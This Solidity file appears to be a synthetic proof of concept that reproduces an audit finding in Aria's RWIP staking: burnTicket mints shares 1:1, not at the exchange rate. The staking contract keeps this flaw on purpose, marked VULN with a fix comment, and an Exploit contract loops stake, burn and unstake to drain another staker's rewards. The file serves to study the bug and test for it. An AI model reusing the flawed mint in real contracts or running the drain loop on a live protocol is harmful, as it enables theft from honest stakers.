// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Aria — stRWIP is always minted for RWIP in a 1:1 ratio
    (Pashov Audit Group, Aria security review 2025-05-12, finding #63676)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: burnTicket mints stRWIP 1:1 with the ticket's RWIP amount
    instead of using the current stRWIP/RWIP exchange rate. After rewards
    inflate the rate, an attacker can stake → burnTicket → unstake and pull
    more RWIP than deposited, draining rewards from honest stakers.
    Vulnerable 1:1 mint preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @dev stRWIP share token; mint/burn restricted to staking.
contract StRWIP is MockERC20 {
    address public minter;

    constructor() MockERC20("Staked RWIP", "stRWIP") {}

    function setMinter(address m) external {
        require(minter == address(0), "set");
        minter = m;
    }

    function mintShares(address to, uint256 amt) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function burnShares(address from, uint256 amt) external {
        require(msg.sender == minter, "minter");
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

/// @notice Reduced RWIPStaking.
/// Source: Aria main-contracts RWIPStaking (Pashov 2025-05-12).
contract RWIPStaking {
    MockERC20 public immutable rwip;
    StRWIP public immutable stRWIP;

    struct Ticket {
        address owner;
        uint256 amount;
        bool burned;
    }

    mapping(uint256 => Ticket) public tickets;
    uint256 public nextTicketId;

    constructor(MockERC20 _rwip, StRWIP _st) {
        rwip = _rwip;
        stRWIP = _st;
    }

    function stake(uint256 amount) external returns (uint256 id) {
        require(amount > 0, "amt");
        rwip.transferFrom(msg.sender, address(this), amount);
        id = nextTicketId++;
        tickets[id] = Ticket({owner: msg.sender, amount: amount, burned: false});
    }

    /// @dev Convert ticket → stRWIP. BUG: always 1:1 with ticket amount.
    function burnTicket(uint256 id) external {
        Ticket storage t = tickets[id];
        require(t.owner == msg.sender, "owner");
        require(!t.burned, "burned");
        t.burned = true;
        // FIX: mint shares = amount * stRWIP.totalSupply() / rwip.balanceOf(address(this))
        //      (with virtual shares / decimal offset to block first-depositor inflation)
        stRWIP.mintShares(msg.sender, t.amount); // @> VULN: mints stRWIP 1:1 with ticket RWIP instead of exchange rate
    }

    /// @dev Redeem stRWIP for RWIP at current exchange rate (balance / supply).
    function unstake(uint256 shares) external {
        require(shares > 0, "shares");
        uint256 supply = stRWIP.totalSupply();
        require(supply > 0, "supply");
        uint256 bal = rwip.balanceOf(address(this));
        uint256 assets = (shares * bal) / supply;
        stRWIP.burnShares(msg.sender, shares);
        rwip.transfer(msg.sender, assets);
    }
}

/// @dev Helper that acts as a staker (Alice).
contract Staker {
    function approve(MockERC20 t, address spender, uint256 amt) external {
        t.approve(spender, amt);
    }

    function stake(RWIPStaking s, uint256 amt) external returns (uint256) {
        return s.stake(amt);
    }

    function burn(RWIPStaking s, uint256 id) external {
        s.burnTicket(id);
    }

    function unstake(RWIPStaking s, uint256 shares) external {
        s.unstake(shares);
    }
}

/// @notice Bob (Exploit) steals rewards Alice earned via stake→burnTicket→unstake.
/// CREATE order: rwip (1), stRWIP (2), staking (3), alice (4).
contract Exploit {
    MockERC20 public rwip;
    StRWIP public stRWIP;
    RWIPStaking public staking;
    Staker public alice;

    uint256 public bobProfit;
    uint256 public aliceFinal;

    constructor() {
        rwip = new MockERC20("RWIP", "RWIP"); // nonce 1
        stRWIP = new StRWIP(); // nonce 2
        staking = new RWIPStaking(rwip, stRWIP); // nonce 3
        stRWIP.setMinter(address(staking));
        alice = new Staker(); // nonce 4
    }

    function run() external {
        // Fund Alice and Bob (this) with 1000 RWIP each
        rwip.mint(address(alice), 1000e18);
        rwip.mint(address(this), 1000e18);

        // Alice stakes 1000, burns ticket → 1000 stRWIP (only staker)
        alice.approve(rwip, address(staking), type(uint256).max);
        uint256 aliceTicket = alice.stake(staking, 1000e18);
        alice.burn(staking, aliceTicket);

        // 500 RWIP rewards deposited while only Alice is staking
        rwip.mint(address(staking), 500e18);

        // Bob loops stake→burn→unstake, siphoning rewards
        rwip.approve(address(staking), type(uint256).max);
        uint256 bobStart = 1000e18;
        for (uint256 i = 0; i < 5; i++) {
            uint256 bal = rwip.balanceOf(address(this));
            if (bal == 0) break;
            uint256 tid = staking.stake(bal);
            staking.burnTicket(tid); // hits @> VULN: 1:1 mint
            uint256 sh = stRWIP.balanceOf(address(this));
            staking.unstake(sh);
        }

        bobProfit = rwip.balanceOf(address(this)) - bobStart;

        // Alice unstakes remaining stRWIP
        uint256 aliceShares = stRWIP.balanceOf(address(alice));
        if (aliceShares > 0) {
            alice.unstake(staking, aliceShares);
        }
        aliceFinal = rwip.balanceOf(address(alice));

        // Harm: Bob extracted rewards that belonged to Alice
        require(bobProfit > 0, "bob no profit");
        require(bobProfit >= 200e18, "bob stole substantial rewards");
        require(aliceFinal < 1000e18 + 100e18, "alice still got most rewards");
        require(rwip.balanceOf(address(this)) > 1000e18, "bob above principal");
    }
}
